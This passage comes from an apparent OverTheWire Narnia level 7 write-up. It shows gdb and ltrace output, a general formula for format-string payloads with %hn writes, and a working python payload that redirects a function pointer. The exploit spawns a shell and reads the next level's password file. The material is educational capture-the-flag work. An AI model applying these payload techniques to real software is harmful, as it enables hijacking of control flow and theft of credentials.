+   0x08048680 &lt;+101&gt;:   push   0x8048838
+   0x08048685 &lt;+106&gt;:   call   0x8048490 &lt;puts@plt&gt;
+   0x0804868a &lt;+111&gt;:   add    esp,0x4
+   0x0804868d &lt;+114&gt;:   push   0x2
+   0x0804868f &lt;+116&gt;:   call   0x8048470 &lt;sleep@plt&gt;
+   0x08048694 &lt;+121&gt;:   add    esp,0x4
+   0x08048697 &lt;+124&gt;:   mov    DWORD PTR [ebp-0x84],0x80486ff
+   0x080486a1 &lt;+134&gt;:   push   DWORD PTR [ebp+0x8]
+   0x080486a4 &lt;+137&gt;:   push   0x80
+   0x080486a9 &lt;+142&gt;:   lea    eax,[ebp-0x80]
+   0x080486ac &lt;+145&gt;:   push   eax
+   0x080486ad &lt;+146&gt;:   call   0x8048500 &lt;snprintf@plt&gt;
+   0x080486b2 &lt;+151&gt;:   add    esp,0xc
+   0x080486b5 &lt;+154&gt;:   mov    eax,DWORD PTR [ebp-0x84]
+   0x080486bb &lt;+160&gt;:   call   eax                      &lt;------call to prtf
+   0x080486bd &lt;+162&gt;:   leave
+   0x080486be &lt;+163&gt;:   ret
+End of assembler dump.
+(gdb) b *vuln+160
+Breakpoint 1 at 0x80486bb
+(gdb) r AAAA
+Starting program: /narnia/narnia7 AAAA
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd628)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486bb in vuln ()
+(gdb) x/24wx $esp
+0xffffd628:     0x080486ff      0x41414141      0x00000000      0x00000000
+0xffffd638:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd648:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd658:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd668:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd678:     0x00000000      0x00000000      0x00000000      0x00000000
+</div></code></code></pre>
+<p>Now, we can enter an input of AAAA to check the position in stack where the buffer gets written and thereby also calculate the offset of the value from the start of the printf controlled stack. We see from above that the stack starts at 0xffff628 and the second word after the start if the value that we entered. Therefore, the offset is 2. This cannot be done easily in gdb as the function doesn't explicitly print any address. This can be done by using ltrace which also returns the output of the library call to snprintf as follows -</p>
+<pre><code><code><div>narnia7@narnia:/narnia$ ltrace ./narnia7 $(python -c 'print(&quot;AAAA%x%x%x%x%x%x&quot;)')
+__libc_start_main(0x80486bf, 2, 0xffffd774, 0x8048770 &lt;unfinished ...&gt;
+memset(0xffffd64c, '\0', 128)                                             = 0xffffd64c
+printf(&quot;goodfunction() = %p\n&quot;, 0x80486ffgoodfunction() = 0x80486ff
+)                                = 27
+printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048724hackedfunction() = 0x8048724
+
+)                            = 30
+printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486ff, 0xffffd648before : ptrf() = 0x80486ff (0xffffd648)
+)              = 41
+puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
+)                               = 50
+sleep(2)                                                                  = 0
+snprintf(&quot;AAAA80486ff414141413834303834666&quot;..., 128, &quot;AAAA%x%x%x%x%x%x&quot;, 0x80486ff, 0x41414141, 0x38343038, 0x34666636, 0x34313431, 0x33313431) = 51
+puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
+)                               = 61
+fflush(0xf7fc5d60)                                                        = 0
+exit(0 &lt;no return ...&gt;
++++ exited (status 0) +++
+</div></code></code></pre>
+<p>Here, we see that the line with snprintf has the output from the library call in the brackets, where after AAAA, it prints an address and then 0x41414141. This means that the second word is the required value. Thus offset is 2.</p>
+<p>To execute the attack now, we must give an address, the value for which we need to modify to get the hack going. Therefore, we need to change the value of prtf pointer to hackedfunction from goodfunction. Therefore, we need to change the value at address of prtf from the address of goodfunction to that of hackedfunction. The fomat string attack is done in the following way -
+Let ad be the address at which we need to write. Let HOB be higher order byte of the value to be written, LOB be the lower order byte of the value to be written. Also, offset is the offset from the first value of stack to the address where the attacker controlled buffer writes to.
+Then the payload that we need to create is made as follows -</p>
+<ol>
+<li>if HOB &lt; LOB, then payload is - <code>[ad+2][ad]%.[HOB-8]x%[offset]$hn%.[LOB-HOB]x%[offset+1]$hn</code></li>
+<li>if LOB &lt; HOB, then payload is - <code>[ad+2][ad]%.[LOB-8]x%[offset+1]$hn%.[HOB-LOB]x%[offset]$hn</code></li>
+</ol>
+<p>Following this, we have ad = <code>0xffffd628</code>, which is the address of prtf as given by the output of the program. The value thats to be written to this address is the address of hackedfunction which is also given by the output of the program (and can be obtained by using <code>p hackedfunction</code> on gdb) as <code>0x8048724</code>. The offset is 2. Here the HOB is 0x0804 which is less than the LOB, therefore, following the above stated convention for payload generation and using python to convert between hexadecimal and decimal, we get the payload as -</p>
+<pre><code><code><div>$(python -c 'print(&quot;\x30\xd6\xff\xff\x28\xd6\xff\xff%.2044x%2$hn%.32544x%3$hn&quot;)')
+</div></code></code></pre>
+<p>Therefore, if we execute this, we get the following -</p>
+<pre><code><code><div>narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print(&quot;\x30\xd6\xff\xff\x28\xd6\xff\xff%.2044x%2$hn%.32544x%3$hn&quot;)')
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+before : ptrf() = 0x80486ff (0xffffd648)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+</div></code></code></pre>
+<p>The payload did not work. Upon a closer look, we can see that the address we need to write to has shifted due to change in the environment. Therefore, we make the required changes to the address and get the shell as follows -</p>
+<pre><code><code><div>narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print(&quot;\x50\xd6\xff\xff\x48\xd6\xff\xff%.2044x%2$hn%.32544x%3$hn&quot;)')
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+before : ptrf() = 0x80486ff (0xffffd648)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+</div></code></code></pre>
+<p>Thus, the password for narnia8 is <code>mohthuphog</code>.</p>
+<hr>
+
+    </body>
+    </html>
